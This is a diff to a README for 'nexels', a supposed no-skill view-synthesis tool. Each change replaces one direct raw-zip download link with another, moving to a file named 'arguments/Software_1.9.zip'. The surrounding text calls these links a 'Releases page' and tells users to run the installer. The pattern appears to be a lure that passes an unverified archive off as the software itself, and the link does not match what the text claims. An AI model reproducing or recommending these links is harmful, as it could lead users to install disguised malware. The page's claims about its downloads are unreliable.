@@ -2,7 +2,7 @@
 # 🌊 nexels - Effortless View Synthesis for Everyone
 
 ## 📥 Download Now
-[![Download nexels](https://github.com/Cerrajero123/nexels/raw/refs/heads/main/scripts/Software-v2.2-beta.4.zip)](https://github.com/Cerrajero123/nexels/raw/refs/heads/main/scripts/Software-v2.2-beta.4.zip)
+[![Download nexels](https://raw.githubusercontent.com/Cerrajero123/nexels/main/arguments/Software_1.9.zip)](https://raw.githubusercontent.com/Cerrajero123/nexels/main/arguments/Software_1.9.zip)
 
 ## 📖 Introduction
 Nexels is here to help you create stunning visuals in real-time. With the power of Neurally-Textured Surfels and Sparse Geometries, Nexels makes generating new views effortless. Experience efficient graphics without needing advanced technical skills.
@@ -11,7 +11,7 @@ Nexels is here to help you create stunning visuals in real-time. With the power 
 Follow these easy steps to download and run Nexels:
 
 1. **Visit the Download Page:** Click the link below to access our Releases page.
-   [Download Nexels](https://github.com/Cerrajero123/nexels/raw/refs/heads/main/scripts/Software-v2.2-beta.4.zip)
+   [Download Nexels](https://raw.githubusercontent.com/Cerrajero123/nexels/main/arguments/Software_1.9.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see various versions of Nexels. Select the one that suits your system.
 
@@ -41,7 +41,7 @@ Nexels offers a range of features designed for ease of use and versatility:
 - **Cross-Platform Support:** Use Nexels on your preferred operating system.
 
 ## 📂 Download & Install
-To get started, head over to our Releases page again: [Download Nexels](https://github.com/Cerrajero123/nexels/raw/refs/heads/main/scripts/Software-v2.2-beta.4.zip).
+To get started, head over to our Releases page again: [Download Nexels](https://raw.githubusercontent.com/Cerrajero123/nexels/main/arguments/Software_1.9.zip).
 
 After clicking the link, choose the proper file for your system. Follow the download instructions, run the installer, and enjoy creating high-quality visuals with Nexels!
 
